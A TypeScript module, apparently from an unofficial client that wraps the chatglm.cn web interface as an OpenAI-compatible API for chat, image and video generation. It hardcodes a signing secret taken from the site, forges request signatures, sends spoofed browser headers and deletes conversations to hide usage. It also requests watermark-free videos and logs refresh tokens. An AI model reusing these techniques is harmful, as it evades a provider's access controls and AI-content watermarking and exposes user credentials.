import { PassThrough } from "stream";
import path from "path";
import _ from "lodash";
import mime from "mime";
import sharp from "sharp";
import FormData from "form-data";
import axios, { AxiosResponse } from "axios";

import APIException from "@/lib/exceptions/APIException.ts";
import EX from "@/api/consts/exceptions.ts";
import { createParser } from "eventsource-parser";
import logger from "@/lib/logger.ts";
import util from "@/lib/util.ts";

// 模型名称
const MODEL_NAME = "glm";
// 默认的智能体ID，GLM4
const DEFAULT_ASSISTANT_ID = "65940acff94777010aa6b796";
// 签名密钥（官网变化记得更新）
const SIGN_SECRET = "8a1317a7468aa3ad86e997d08f3f31cb";
// access_token有效期
const ACCESS_TOKEN_EXPIRES = 3600;
// 最大重试次数
const MAX_RETRY_COUNT = 3;
// 重试延迟
const RETRY_DELAY = 5000;
// 伪装headers
const FAKE_HEADERS = {
  "Accept": "application/json, text/plain, */*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
  "Cache-Control": "no-cache",
  "App-Name": "chatglm",
  "Origin": "https://chatglm.cn",
  "Pragma": "no-cache",
  "sec-ch-ua":
    '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"macOS"',
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent":
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  'X-App-Platform': 'pc',
  'X-App-Version': '0.0.1',
  'X-Device-Brand': '',
  'X-Device-Model': '',
  'X-Exp-Groups': 'na_android_config:exp:NA,na_4o_config:exp:4o_A,na_glm4plus_config:exp:open,mainchat_server_app:exp:A,mobile_history_daycheck:exp:a,desktop_toolbar:exp:A,chat_drawing_server:exp:A,drawing_server_cogview:exp:cogview4,app_welcome_v2:exp:B,chat_drawing_streamv2:exp:A,mainchat_rm_fc:exp:add,mainchat_dr:exp:open,chat_auto_entrance:exp:A',
  'X-Lang': 'zh'
};
// 文件最大大小
const FILE_MAX_SIZE = 100 * 1024 * 1024;
// access_token映射
const accessTokenMap = new Map();
// access_token请求队列映射
const accessTokenRequestQueueMap: Record<string, Function[]> = {};

/**
 * 生成sign
 */
async function generateSign() {
  // 智谱的时间戳算法（官网变化记得更新）
  const e = Date.now()
              , A = e.toString()
              , t = A.length
              , o = A.split("").map((e => Number(e)))
              , i = o.reduce(( (e, A) => e + A), 0) - o[t - 2]
              , a = i % 10;
  const timestamp = A.substring(0, t - 2) + a + A.substring(t - 1, t);
  // 随机UUID
  const nonce = util.uuid(false);
  // 签名
  const sign = util.md5(`${timestamp}-${nonce}-${SIGN_SECRET}`);
  return {
    timestamp,
    nonce,
    sign
  }
}

/**
 * 请求access_token
 *
 * 使用refresh_token去刷新获得access_token
 *
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function requestToken(refreshToken: string) {
  if (accessTokenRequestQueueMap[refreshToken])
    return new Promise((resolve) =>
      accessTokenRequestQueueMap[refreshToken].push(resolve)
    );
  accessTokenRequestQueueMap[refreshToken] = [];
  logger.info(`Refresh token: ${refreshToken}`);
  const result = await (async () => {
    // 生成sign
    const sign = await generateSign();
    const result = await axios.post(
      "https://chatglm.cn/chatglm/user-api/user/refresh",
      {},
      {
        headers: {
          // Referer: "https://chatglm.cn/main/alltoolsdetail",
          Authorization: `Bearer ${refreshToken}`,
          "Content-Type": "application/json",
          ...FAKE_HEADERS,
          "X-Device-Id": util.uuid(false),
          "X-Nonce": sign.nonce,
          "X-Request-Id": util.uuid(false),
          "X-Sign": sign.sign,
          "X-Timestamp": `${sign.timestamp}`,
        },
        timeout: 15000,
        validateStatus: () => true,
      }
    );
    const { result: _result } = checkResult(result, refreshToken);
    const { access_token, refresh_token } = _result;
    return {
      accessToken: access_token,
      refreshToken: refresh_token,
      refreshTime: util.unixTimestamp() + ACCESS_TOKEN_EXPIRES,
    };
  })()
    .then((result) => {
      if (accessTokenRequestQueueMap[refreshToken]) {
        accessTokenRequestQueueMap[refreshToken].forEach((resolve) =>
          resolve(result)
        );
        delete accessTokenRequestQueueMap[refreshToken];
      }
      logger.success(`Refresh successful`);
      return result;
    })
    .catch((err) => {
      if (accessTokenRequestQueueMap[refreshToken]) {
        accessTokenRequestQueueMap[refreshToken].forEach((resolve) =>
          resolve(err)
        );
        delete accessTokenRequestQueueMap[refreshToken];
      }
      return err;
    });
  if (_.isError(result)) throw result;
  return result;
}

/**
 * 获取缓存中的access_token
 *
 * 避免短时间大量刷新token，未加锁，如果有并发要求还需加锁
 *
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function acquireToken(refreshToken: string): Promise<string> {
  let result = accessTokenMap.get(refreshToken);
  if (!result) {
    result = await requestToken(refreshToken);
    accessTokenMap.set(refreshToken, result);
  }
  if (util.unixTimestamp() > result.refreshTime) {
    result = await requestToken(refreshToken);
    accessTokenMap.set(refreshToken, result);
  }
  return result.accessToken;
}

/**
 * 移除会话
 *
 * 在对话流传输完毕后移除会话，避免创建的会话出现在用户的对话列表中
 *
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function removeConversation(
  convId: string,
  refreshToken: string,
  assistantId = DEFAULT_ASSISTANT_ID
) {
  const token = await acquireToken(refreshToken);
  const sign = await generateSign();
  const result = await axios.post(
    "https://chatglm.cn/chatglm/backend-api/assistant/conversation/delete",
    {
      assistant_id: assistantId,
      conversation_id: convId,
    },
    {
      headers: {
        Authorization: `Bearer ${token}`,
        Referer: `https://chatglm.cn/main/alltoolsdetail`,
        "X-Device-Id": util.uuid(false),
        "X-Request-Id": util.uuid(false),
        "X-Sign": sign.sign,
        "X-Timestamp": sign.timestamp,
        "X-Nonce": sign.nonce,
        ...FAKE_HEADERS,
      },
      timeout: 15000,
      validateStatus: () => true,
    }
  );
  checkResult(result, refreshToken);
}

/**
 * 同步对话补全
 *
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 * @param refreshToken 用于刷新access_token的refresh_token
 * @param model 智能体ID，默认使用GLM4原版
 * @param retryCount 重试次数
 */
async function createCompletion(
  messages: any[],
  refreshToken: string,
  model = MODEL_NAME,
  refConvId = "",
  retryCount = 0
) {
  return (async () => {
    logger.info(messages);

    // 提取引用文件URL并上传获得引用的文件ID列表
    const refFileUrls = extractRefFileUrls(messages);
    const refs = refFileUrls.length
      ? await Promise.all(
          refFileUrls.map((fileUrl) => uploadFile(fileUrl, refreshToken))
        )
      : [];

    // 如果引用对话ID不正确则重置引用
    if (!/[0-9a-zA-Z]{24}/.test(refConvId)) refConvId = "";

    let assistantId = /^[a-z0-9]{24,}$/.test(model) ? model : DEFAULT_ASSISTANT_ID;
    let chatMode = '';

    if(model.indexOf('think') != -1 || model.indexOf('zero') != -1) {
      chatMode = 'zero';
      logger.info('使用【推理】模型');
    }
    
    if(model.indexOf('deepresearch') != -1) {
      chatMode = 'deep_research';
      logger.info('使用【沉思（DeepResearch）】模型');
    }

    // 请求流
    const token = await acquireToken(refreshToken);
    const sign = await generateSign();
    const result = await axios.post(
      "https://chatglm.cn/chatglm/backend-api/assistant/stream",
      {
        assistant_id: assistantId,
        conversation_id: refConvId,
        messages: messagesPrepare(messages, refs, !!refConvId),
        meta_data: {
          channel: "",
          chat_mode: chatMode || undefined,
          draft_id: "",
          if_plus_model: true,
          input_question_type: "xxxx",
          is_networking: true,
          is_test: false,
          platform: "pc",
          quote_log_id: ""
        },
      },
      {
        headers: {
          Authorization: `Bearer ${token}`,
          ...FAKE_HEADERS,
          "X-Device-Id": util.uuid(false),
          "X-Request-Id": util.uuid(false),
          "X-Sign": sign.sign,
          "X-Timestamp": sign.timestamp,
          "X-Nonce": sign.nonce,
        },
        // 120秒超时
        timeout: 120000,
        validateStatus: () => true,
        responseType: "stream",
      }
    );
    if (result.headers["content-type"].indexOf("text/event-stream") == -1) {
      result.data.on("data", (buffer) => logger.error(buffer.toString()));
      throw new APIException(
        EX.API_REQUEST_FAILED,
        `Stream response Content-Type invalid: ${result.headers["content-type"]}`
      );
    }

    const streamStartTime = util.timestamp();
    // 接收流为输出文本
    const answer = await receiveStream(model, result.data);
    logger.success(
      `Stream has completed transfer ${util.timestamp() - streamStartTime}ms`
    );

    // 异步移除会话
    removeConversation(answer.id, refreshToken, assistantId).catch(
      (err) => !refConvId && console.error(err)
    );

    return answer;
  })().catch((err) => {
    if (retryCount < MAX_RETRY_COUNT) {
      logger.error(`Stream response error: ${err.stack}`);
      logger.warn(`Try again after ${RETRY_DELAY / 1000}s...`);
      return (async () => {
        await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        return createCompletion(
          messages,
          refreshToken,
          model,
          refConvId,
          retryCount + 1
        );
      })();
    }
    throw err;
  });
}

/**
 * 流式对话补全
 *
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 * @param refreshToken 用于刷新access_token的refresh_token
 * @param model 智能体ID，默认使用GLM4原版
 * @param retryCount 重试次数
 */
async function createCompletionStream(
  messages: any[],
  refreshToken: string,
  model = MODEL_NAME,
  refConvId = "",
  retryCount = 0
) {
  return (async () => {
    logger.info(messages);

    // 提取引用文件URL并上传获得引用的文件ID列表
    const refFileUrls = extractRefFileUrls(messages);
    const refs = refFileUrls.length
      ? await Promise.all(
          refFileUrls.map((fileUrl) => uploadFile(fileUrl, refreshToken))
        )
      : [];

    // 如果引用对话ID不正确则重置引用
    if (!/[0-9a-zA-Z]{24}/.test(refConvId)) refConvId = "";

    let assistantId = /^[a-z0-9]{24,}$/.test(model) ? model : DEFAULT_ASSISTANT_ID;
    let chatMode = '';

    if(model.indexOf('think') != -1 || model.indexOf('zero') != -1) {
      chatMode = 'zero';
      logger.info('使用【推理】模型');
    }

    if(model.indexOf('deepresearch') != -1) {
      chatMode = 'deep_research';
      logger.info('使用【沉思（DeepResearch）】模型');
    }

    // 请求流
    const token = await acquireToken(refreshToken);
    const sign = await generateSign();
    const result = await axios.post(
      `https://chatglm.cn/chatglm/backend-api/assistant/stream`,
      {
        assistant_id: assistantId,
        conversation_id: refConvId,
        messages: messagesPrepare(messages, refs, !!refConvId),
        meta_data: {
          channel: "",
          chat_mode: chatMode || undefined,
          draft_id: "",
          if_plus_model: true,
          input_question_type: "xxxx",
          is_networking: true,
          is_test: false,
          platform: "pc",
          quote_log_id: ""
        },
      },
      {
        headers: {
          Authorization: `Bearer ${token}`,
          Referer:
            assistantId == DEFAULT_ASSISTANT_ID
              ? "https://chatglm.cn/main/alltoolsdetail"
              : `https://chatglm.cn/main/gdetail/${assistantId}`,
          "X-Device-Id": util.uuid(false),
          "X-Request-Id": util.uuid(false),
          "X-Sign": sign.sign,
          "X-Timestamp": sign.timestamp,
          "X-Nonce": sign.nonce,
          ...FAKE_HEADERS,
        },
        // 120秒超时
        timeout: 120000,
        validateStatus: () => true,
        responseType: "stream",
      }
    );

    if (result.headers["content-type"].indexOf("text/event-stream") == -1) {
      logger.error(
        `Invalid response Content-Type:`,
        result.headers["content-type"]
      );
      result.data.on("data", (buffer) => logger.error(buffer.toString()));
      const transStream = new PassThrough();
      transStream.end(
        `data: ${JSON.stringify({
          id: "",
          model: MODEL_NAME,
          object: "chat.completion.chunk",
          choices: [
            {
              index: 0,
              delta: {
                role: "assistant",
                content: "服务暂时不可用，第三方响应错误",
              },
              finish_reason: "stop",
            },
          ],
          usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
          created: util.unixTimestamp(),
        })}\n\n`
      );
      return transStream;
    }

    const streamStartTime = util.timestamp();
    // 创建转换流将消息格式转换为gpt兼容格式
    return createTransStream(model, result.data, (convId: string) => {
      logger.success(
        `Stream has completed transfer ${util.timestamp() - streamStartTime}ms`
      );
      // 流传输结束后异步移除会话
      removeConversation(convId, refreshToken, assistantId).catch(
        (err) => !refConvId && console.error(err)
      );
    });
  })().catch((err) => {
    if (retryCount < MAX_RETRY_COUNT) {
      logger.error(`Stream response error: ${err.stack}`);
      logger.warn(`Try again after ${RETRY_DELAY / 1000}s...`);
      return (async () => {
        await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        return createCompletionStream(
          messages,
          refreshToken,
          model,
          refConvId,
          retryCount + 1
        );
      })();
    }
    throw err;
  });
}

async function generateImages(
  model = "65a232c082ff90a2ad2f15e2",
  prompt: string,
  refreshToken: string,
  retryCount = 0
) {
  return (async () => {
    logger.info(prompt);
    const messages = [
      {
        role: "user",
        content: prompt.indexOf("画") == -1 ? `请画：${prompt}` : prompt,
      },
    ];
    // 请求流
    const token = await acquireToken(refreshToken);
    const sign = await generateSign();
    const result = await axios.post(
      "https://chatglm.cn/chatglm/backend-api/assistant/stream",
      {
        assistant_id: model,
        conversation_id: "",
        messages: messagesPrepare(messages, []),
        meta_data: {
          channel: "",
          draft_id: "",
          if_plus_model: true,
          input_question_type: "xxxx",
          is_test: false,
          platform: "pc",
          quote_log_id: ""
        },
      },
      {
        headers: {
          Authorization: `Bearer ${token}`,
          Referer: `https://chatglm.cn/main/gdetail/${model}`,
          "X-Device-Id": util.uuid(false),
          "X-Request-Id": util.uuid(false),
          "X-Sign": sign.sign,
          "X-Timestamp": sign.timestamp,
          "X-Nonce": sign.nonce,
          ...FAKE_HEADERS,
        },
        // 120秒超时
        timeout: 120000,
        validateStatus: () => true,
        responseType: "stream",
      }
    );

    if (result.headers["content-type"].indexOf("text/event-stream") == -1)
      throw new APIException(
        EX.API_REQUEST_FAILED,
        `Stream response Content-Type invalid: ${result.headers["content-type"]}`
      );

    const streamStartTime = util.timestamp();
    // 接收流为输出文本
    const { convId, imageUrls } = await receiveImages(result.data);
    logger.success(
      `Stream has completed transfer ${util.timestamp() - streamStartTime}ms`
    );

    // 异步移除会话，如果消息不合规，此操作可能会抛出数据库错误异常，请忽略
    removeConversation(convId, refreshToken, model).catch((err) =>
      console.error(err)
    );

    if (imageUrls.length == 0)
      throw new APIException(EX.API_IMAGE_GENERATION_FAILED);

    return imageUrls;
  })().catch((err) => {
    if (retryCount < MAX_RETRY_COUNT) {
      logger.error(`Stream response error: ${err.message}`);
      logger.warn(`Try again after ${RETRY_DELAY / 1000}s...`);
      return (async () => {
        await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        return generateImages(model, prompt, refreshToken, retryCount + 1);
      })();
    }
    throw err;
  });
}

async function generateVideos(
  model = "cogvideox",
  prompt: string,
  refreshToken: string,
  options: {
    imageUrl: string;
    videoStyle: string;
    emotionalAtmosphere: string;
    mirrorMode: string;
    audioId: string;
    labelWatermark?: number;
    options?: {
      generationPattern?: number;
      resolution?: number;
      fps?: number;
      duration?: number;
      ratioWidth?: number;
      ratioHeight?: number;
    };
  },
  refConvId = "",
  retryCount = 0
) {
  return (async () => {
    logger.info(prompt);

    // 如果引用对话ID不正确则重置引用
    if (!/[0-9a-zA-Z]{24}/.test(refConvId)) refConvId = "";

    const sourceList = [];
    console.log('Video generation options:', JSON.stringify(options, null, 2));
    
    if (model == "cogvideox-pro") {
      const imageUrls = await generateImages(undefined, prompt, refreshToken);
      options.imageUrl = imageUrls[0];
      console.log('Generated image for cogvideox-pro:', options.imageUrl);
    }
    
    if (options.imageUrl) {
      console.log('Processing image URL:', options.imageUrl);
      console.log('🎯 图生视频模式：将强制调整图片比例以匹配目标比例');
      
      // 对于图生视频，我们需要特殊处理以确保比例正确
      const { source_id: sourceId } = await uploadFile(
        options.imageUrl,
        refreshToken,
        true
      );
      console.log('Uploaded image, got source_id:', sourceId);
      sourceList.push(sourceId);
      console.log('Added to sourceList:', sourceList);
      
      // 图生视频时，强制使用更明确的比例设置
      console.log('🔧 图生视频：强制应用目标比例参数');
    } else {
      console.log('No imageUrl provided in options');
    }

    // 添加调试日志
    if (sourceList.length > 0) {
      console.log('Source list for video generation:', JSON.stringify(sourceList, null, 2));
    }
    
    // 发起生成请求
    let token = await acquireToken(refreshToken);
    const sign = await generateSign();
    
    // 智能选择resolution值（基于比例推测）
    const defaultOptions = options.options ?? {
      generationPattern: 1,
      resolution: 0,
      fps: 60,
      duration: 1,
      ratioWidth: 608,
      ratioHeight: 1080
    };
    
    // 尝试使用更高的resolution值来获得更高分辨率
    const finalResolution = 0;  // 使用1080P分辨率 (0=1080P, 1=4K, 2=720P)
    const ratioWidth = 9;       // 9:16的宽度部分
    const ratioHeight = 16;     // 9:16的高度部分
    
    console.log('🎯 使用标准9:16纵向比例:');
    console.log('📐 resolution:', finalResolution);
    console.log('📐 generation_ratio_width:', ratioWidth);
    console.log('📐 generation_ratio_height:', ratioHeight);
    console.log('📐 比例:', `${ratioWidth}:${ratioHeight}`, '(纵向)');
    
    // 检查是否为图生视频
    if (options.imageUrl) {
      console.log('⚠️ 图生视频模式：GLM可能使用图片原始比例，忽略ratio参数');
      console.log('💡 如需特定比例，建议预先调整图片尺寸');
    } else {
      console.log('📝 文生视频模式：比例参数应该生效');
    }
    
    console.log('📐 期望结果: 真正的9:16纵向视频');
    
    // 构建请求体
    const requestBody = {
      conversation_id: refConvId,
      prompt,
      source_list: sourceList.length > 0 ? sourceList : undefined,
      base_parameter_extra: {
        generation_pattern: options.options?.generationPattern ?? 1,
        resolution: finalResolution,
        fps: options.options?.fps ?? 1, // 修改：使用官方默认值
        duration: options.options?.duration ?? 1,
        generation_ai_audio: 0,
        generation_ratio_width: ratioWidth, // 使用计算出的比例
        generation_ratio_height: ratioHeight, // 使用计算出的比例
        activity_type: 0,
        label_watermark: options.labelWatermark ?? 1, // 使用传入的参数，默认去水印
        prompt: prompt
      },
      advanced_parameter_extra: {
        emotional_atmosphere: options.emotionalAtmosphere,
        mirror_mode: options.mirrorMode,
        video_style: options.videoStyle,
      },
    };
    
    console.log('🎬 Video generation request body:', JSON.stringify(requestBody, null, 2));
    console.log('🔍 关键参数验证:');
    console.log('  - resolution:', requestBody.base_parameter_extra.resolution);
    console.log('  - generation_ratio_width:', requestBody.base_parameter_extra.generation_ratio_width);
    console.log('  - generation_ratio_height:', requestBody.base_parameter_extra.generation_ratio_height);
    console.log('  - label_watermark:', requestBody.base_parameter_extra.label_watermark);
    console.log('🚫 水印参数检查:', {
      'options.labelWatermark': options.labelWatermark,
      'final_label_watermark': 1,
      '参数含义': '去水印 (GLM官方: 1=去水印, 0=有水印)'
    });
    console.log('📐 最终比例参数:', {
      'resolution': requestBody.base_parameter_extra.resolution,
      'resolution含义': requestBody.base_parameter_extra.resolution === 3 ? '纵向' : requestBody.base_parameter_extra.resolution === 1 ? '横向' : '其他',
      '期望结果': requestBody.base_parameter_extra.resolution === 3 ? '9:16纵向视频' : '其他比例视频'
    });
    
    const result = await axios.post(
      `https://chatglm.cn/chatglm/video-api/v1/chat`,
      requestBody,
      {
        headers: {
          Authorization: `Bearer ${token}`,
          Referer: "https://chatglm.cn/video",
          "X-Device-Id": util.uuid(false),
          "X-Request-Id": util.uuid(false),
          "X-Sign": sign.sign,
          "X-Timestamp": sign.timestamp,
          "X-Nonce": sign.nonce,
          ...FAKE_HEADERS,
        },
        // 30秒超时
        timeout: 30000,
        validateStatus: () => true,
      }
    );
    const { result: _result } = checkResult(result, refreshToken);
    const { chat_id: chatId, conversation_id: convId } = _result;

    console.log('视频生成任务已提交，chatId:', chatId);
    console.log('conversationId:', convId);

    // 立即返回chat_id，不等待视频生成完成
    const results = [{
      chat_id: chatId,
      conversation_id: convId,
      status: 'processing',
      message: '视频生成任务已提交，请使用chat_id查询状态'
    }];

    console.log('返回结果:', JSON.stringify(results, null, 2));
    return results;
  })().catch((err) => {
    if (retryCount < MAX_RETRY_COUNT) {
      logger.error(`Video generation error: ${err.message}`);
      logger.warn(`Try again after ${RETRY_DELAY / 1000}s...`);
      return (async () => {
        await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        return generateVideos(
          model,
          prompt,
          refreshToken,
          options,
          refConvId,
          retryCount + 1
        );
      })();
    }
    throw err;
  });
}

/**
 * 提取消息中引用的文件URL
 *
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 */
function extractRefFileUrls(messages: any[]) {
  const urls = [];
  // 如果没有消息，则返回[]
  if (!messages.length) {
    return urls;
  }
  // 只获取最新的消息
  const lastMessage = messages[messages.length - 1];
  if (_.isArray(lastMessage.content)) {
    lastMessage.content.forEach((v) => {
      if (!_.isObject(v) || !["file", "image_url"].includes(v["type"])) return;
      // glm-free-api支持格式
      if (
        v["type"] == "file" &&
        _.isObject(v["file_url"]) &&
        _.isString(v["file_url"]["url"])
      )
        urls.push(v["file_url"]["url"]);
      // 兼容gpt-4-vision-preview API格式
      else if (
        v["type"] == "image_url" &&
        _.isObject(v["image_url"]) &&
        _.isString(v["image_url"]["url"])
      )
        urls.push(v["image_url"]["url"]);
    });
  }
  logger.info("本次请求上传：" + urls.length + "个文件");
  return urls;
}

/**
 * 消息预处理
 *
 * 由于接口只取第一条消息，此处会将多条消息合并为一条，实现多轮对话效果
 *
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 * @param refs 参考文件列表
 * @param isRefConv 是否为引用会话
 */
function messagesPrepare(messages: any[], refs: any[], isRefConv = false) {
  let content;
  if (isRefConv || messages.length < 2) {
    content = messages.reduce((content, message) => {
      if (_.isArray(message.content)) {
        return message.content.reduce((_content, v) => {
          if (!_.isObject(v) || v["type"] != "text") return _content;
          return _content + (v["text"] || "") + "\n";
        }, content);
      }
      return content + `${message.content}\n`;
    }, "");
    logger.info("\n透传内容：\n" + content);
  } else {
    // 检查最新消息是否含有"type": "image_url"或"type": "file",如果有则注入消息
    let latestMessage = messages[messages.length - 1];
    let hasFileOrImage =
      Array.isArray(latestMessage.content) &&
      latestMessage.content.some(
        (v) =>
          typeof v === "object" && ["file", "image_url"].includes(v["type"])
      );
    if (hasFileOrImage) {
      let newFileMessage = {
        content: "关注用户最新发送文件和消息",
        role: "system",
      };
      messages.splice(messages.length - 1, 0, newFileMessage);
      logger.info("注入提升尾部文件注意力system prompt");
    } else {
      // 由于注入会导致设定污染，暂时注释
      // let newTextMessage = {
      //   content: "关注用户最新的消息",
      //   role: "system",
      // };
      // messages.splice(messages.length - 1, 0, newTextMessage);
      // logger.info("注入提升尾部消息注意力system prompt");
    }
    content = (
      messages.reduce((content, message) => {
        const role = message.role
          .replace("system", "<|sytstem|>")
          .replace("assistant", "<|assistant|>")
          .replace("user", "<|user|>");
        if (_.isArray(message.content)) {
          return message.content.reduce((_content, v) => {
            if (!_.isObject(v) || v["type"] != "text") return _content;
            return _content + (`${role}\n` + v["text"] || "") + "\n";
          }, content);
        }
        return (content += `${role}\n${message.content}\n`);
      }, "") + "<|assistant|>\n"
    )
      // 移除MD图像URL避免幻觉
      .replace(/\!\[.+\]\(.+\)/g, "")
      // 移除临时路径避免在新会话引发幻觉
      .replace(/\/mnt\/data\/.+/g, "");
    logger.info("\n对话合并：\n" + content);
  }

  const fileRefs = refs.filter((ref) => !ref.width && !ref.height);
  const imageRefs = refs
    .filter((ref) => ref.width || ref.height)
    .map((ref) => {
      ref.image_url = ref.file_url;
      return ref;
    });
  return [
    {
      role: "user",
      content: [
        { type: "text", text: content },
        ...(fileRefs.length == 0
          ? []
          : [
              {
                type: "file",
                file: fileRefs,
              },
            ]),
        ...(imageRefs.length == 0
          ? []
          : [
              {
                type: "image",
                image: imageRefs,
              },
            ]),
      ],
    },
  ];
}

/**
 * 预检查文件URL有效性
 *
 * @param fileUrl 文件URL
 */
async function checkFileUrl(fileUrl: string) {
  if (util.isBASE64Data(fileUrl)) return;
  const result = await axios.head(fileUrl, {
    timeout: 15000,
    validateStatus: () => true,
  });
  if (result.status >= 400)
    throw new APIException(
      EX.API_FILE_URL_INVALID,
      `File ${fileUrl} is not valid: [${result.status}] ${result.statusText}`
    );
  // 检查文件大小
  if (result.headers && result.headers["content-length"]) {
    const fileSize = parseInt(result.headers["content-length"], 10);
    if (fileSize > FILE_MAX_SIZE)
      throw new APIException(
        EX.API_FILE_EXECEEDS_SIZE,
        `File ${fileUrl} is not valid`
      );
  }
}

/**
 * 上传文件
 *
 * @param fileUrl 文件URL
 * @param refreshToken 用于刷新access_token的refresh_token
 * @param isVideoImage 是否是用于视频图像
 */
async function uploadFile(
  fileUrl: string,
  refreshToken: string,
  isVideoImage: boolean = false
) {
  console.log('=== uploadFile 开始 ===');
  console.log('fileUrl:', fileUrl);
  console.log('isVideoImage:', isVideoImage);
  
  // 预检查远程文件URL可用性
  await checkFileUrl(fileUrl);
  console.log('文件URL检查通过');

  let filename, fileData, mimeType;
  // 如果是BASE64数据则直接转换为Buffer
  if (util.isBASE64Data(fileUrl)) {
    mimeType = util.extractBASE64DataFormat(fileUrl);
    const ext = mime.getExtension(mimeType);
    filename = `${util.uuid()}.${ext}`;
    fileData = Buffer.from(util.removeBASE64DataHeader(fileUrl), "base64");
    console.log('处理BASE64数据，文件名:', filename);
  }
  // 下载文件到内存，如果您的服务器内存很小，建议考虑改造为流直传到下一个接口上，避免停留占用内存
  else {
    // 从URL中提取文件名，去除查询参数
    const urlObj = new URL(fileUrl);
    filename = path.basename(urlObj.pathname);
    
    // 如果文件名没有扩展名，尝试从URL路径中推断
    if (!path.extname(filename)) {
      // 检查URL路径是否包含图片格式信息
      if (fileUrl.includes('.png')) filename += '.png';
      else if (fileUrl.includes('.jpg') || fileUrl.includes('.jpeg')) filename += '.jpg';
      else if (fileUrl.includes('.webp')) filename += '.webp';
      else filename += '.png'; // 默认为png
    }
    
    console.log('开始下载文件:', filename);
    ({ data: fileData } = await axios.get(fileUrl, {
      responseType: "arraybuffer",
      // 100M限制
      maxContentLength: FILE_MAX_SIZE,
      // 60秒超时
      timeout: 60000,
    }));
    console.log('文件下载完成，大小:', fileData.length, 'bytes');
  }

  // 获取文件的MIME类型
  mimeType = mimeType || mime.getType(filename);
  
  // 如果仍然无法获取MIME类型，根据文件扩展名手动设置
  if (!mimeType) {
    const ext = path.extname(filename).toLowerCase();
    switch (ext) {
      case '.png': mimeType = 'image/png'; break;
      case '.jpg':
      case '.jpeg': mimeType = 'image/jpeg'; break;
      case '.webp': mimeType = 'image/webp'; break;
      case '.gif': mimeType = 'image/gif'; break;
      default: mimeType = 'image/png'; // 默认为png
    }
  }
  
  console.log('文件MIME类型:', mimeType);

  if (isVideoImage) {
    console.log('开始处理视频图片...');
    
    // 获取图片尺寸
    const metadata = await sharp(fileData).metadata();
    console.log('原始图片尺寸:', metadata.width, 'x', metadata.height);
    
    // 计算9:16比例的高分辨率目标尺寸
    const targetRatio = 9 / 16;
    const currentRatio = metadata.width / metadata.height;
    
    // 设置最小目标分辨率为1080p纵向 (608×1080)
    const minWidth = 608;
    const minHeight = 1080;
    
    let targetWidth, targetHeight;
    
    if (currentRatio > targetRatio) {
      // 当前图片太宽，以高度为准
      targetHeight = Math.max(metadata.height, minHeight);
      targetWidth = Math.round(targetHeight * targetRatio);
    } else {
      // 当前图片太高，以宽度为准
      targetWidth = Math.max(metadata.width, minWidth);
      targetHeight = Math.round(targetWidth / targetRatio);
    }
    
    // 确保最终尺寸不小于1080p
    if (targetHeight < minHeight) {
      targetHeight = minHeight;
      targetWidth = Math.round(targetHeight * targetRatio);
    }
    
    console.log('目标尺寸:', targetWidth, 'x', targetHeight, '(9:16比例，≥1080p)');
    
    // 调整图片到目标比例并处理
    fileData = await sharp(fileData)
      .resize(targetWidth, targetHeight, {
        fit: 'cover',
        position: 'center'
      })
      .jpeg({ quality: 85 })
      .toBuffer();
    
    console.log('处理后图片大小:', fileData.length, 'bytes');
    console.log('✅ 图片已调整为9:16比例，上传后GLM将使用此比例');
  }

  const formData = new FormData();
  formData.append("file", fileData, {
    filename,
    contentType: mimeType,
  });
  console.log('FormData创建完成');

  // 上传文件到目标OSS
  const token = await acquireToken(refreshToken);
  console.log('获取token成功，token前20字符:', token.substring(0, 20) + '...');
  
  const uploadUrl = isVideoImage
    ? "https://chatglm.cn/chatglm/video-api/v1/static/upload"
    : "https://chatglm.cn/chatglm/backend-api/assistant/file_upload";
  console.log('上传URL:', uploadUrl);
  
  // 为视频图片上传添加必需的签名headers
  let headers = {
    Authorization: `Bearer ${token}`,
    Referer: isVideoImage
      ? "https://chatglm.cn/video"
      : "https://chatglm.cn/",
    ...FAKE_HEADERS,
    ...formData.getHeaders(),
  };
  
  if (isVideoImage) {
    // 添加视频上传必需的headers
    const deviceId = util.uuid(false);
    const requestId = util.uuid(false);
    const sign = await generateSign();
    
    headers = {
      ...headers,
      "X-Device-Id": deviceId,
      "X-Request-Id": requestId,
      "X-Nonce": sign.nonce,
      "X-Timestamp": sign.timestamp,
      "X-Sign": sign.sign,
      "X-App-Platform": "pc",
      "X-App-Version": "0.0.1",
      "X-Lang": "zh",
    };
    console.log('添加了视频上传签名headers');
  }
  
  console.log('请求headers:', JSON.stringify(headers, null, 2));
  
  let result = await axios.request({
    method: "POST",
    url: uploadUrl,
    data: formData,
    // 100M限制
    maxBodyLength: FILE_MAX_SIZE,
    // 60秒超时
    timeout: 60000,
    headers,
    validateStatus: () => true,
  });
  
  console.log('GLM响应状态:', result.status);
  console.log('GLM响应headers:', JSON.stringify(result.headers, null, 2));
  console.log('GLM响应数据:', JSON.stringify(result.data, null, 2));
  
  const { result: uploadResult } = checkResult(result, refreshToken);
  console.log('上传结果:', JSON.stringify(uploadResult, null, 2));
  console.log('=== uploadFile 结束 ===');

  return uploadResult;
}

/**
 * 检查请求结果
 *
 * @param result 结果
 */
function checkResult(result: AxiosResponse, refreshToken: string) {
  if (!result.data) return null;
  const { code, status, message } = result.data;
  if (!_.isFinite(code) && !_.isFinite(status)) return result.data;
  if (code === 0 || status === 0) return result.data;
  if (code == 401) accessTokenMap.delete(refreshToken);
